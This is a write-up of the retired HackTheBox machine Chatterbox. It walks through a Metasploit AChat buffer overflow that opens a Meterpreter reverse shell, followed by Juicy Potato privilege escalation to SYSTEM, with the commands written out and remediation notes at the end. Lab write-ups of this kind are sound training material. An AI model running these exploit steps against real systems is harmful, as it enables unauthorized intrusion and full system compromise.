HTB Chatterbox: AChat overflow and Juicy Potato to SYSTEM

retired-machineeasy

Chatterbox is a retired HackTheBox easy Windows machine pairing two textbook techniques. Synopsis: an AChat buffer overflow for foothold plus SeImpersonatePrivilege — the exact recipe Juicy Potato was made for.

$ Enumeration — Nmap, all ports

# nmap: full sweep for odd services
nmap -sC -sV -p- -oN chatterbox.nmap 10.10.10.74

An unusual high port runs AChat 0.150 beta7 — a small chat server — beside standard Windows ports. Niche network services with old versions are always worth fingerprinting twice.

$ Foothold — AChat overflow

# msfconsole: achat_bof
msfconsole -q
msf6 > use exploit/windows/misc/achat_bof
msf6 exploit(achat_bof) > set RHOSTS 10.10.10.74
msf6 exploit(achat_bof) > set LHOST 10.10.14.23
msf6 exploit(achat_bof) > run
[*] Meterpreter session 1 opened as ALFRED\Alfred

AChat 0.150 beta7 has a public stack overflow in username handling. The module returns a shell as the low-privilege Alfred user.

$ Privilege escalation — Juicy Potato

# meterpreter: check privs, run potato
meterpreter > getprivs   # SeImpersonatePrivilege present
# upload JuicyPotato.exe, then:
meterpreter > execute -f JuicyPotato.exe -a "-l 1337 -p c:\windows\system32\cmd.exe -a \"/c whoami\" -t * -c {CLSID}"

SeImpersonatePrivilege lets Juicy Potato clone a SYSTEM token into your shell (pick a working CLSID for the OS build). Service accounts with impersonation rights are standing SYSTEM-equivalents. Flag values redacted per HTB rules; earn them in your own lab.

$ Dead ends

Fuzzing HTTP first (the chat port is the attack surface — scan all 65k and read every banner) and kernel exploits before checking privileges (whoami /priv takes five seconds and names the potato path).

$ Remediation notes

Retire abandonware network services, strip SeImpersonatePrivilege where unneeded, and monitor for potato indicators. Written by Lucky Thandel.
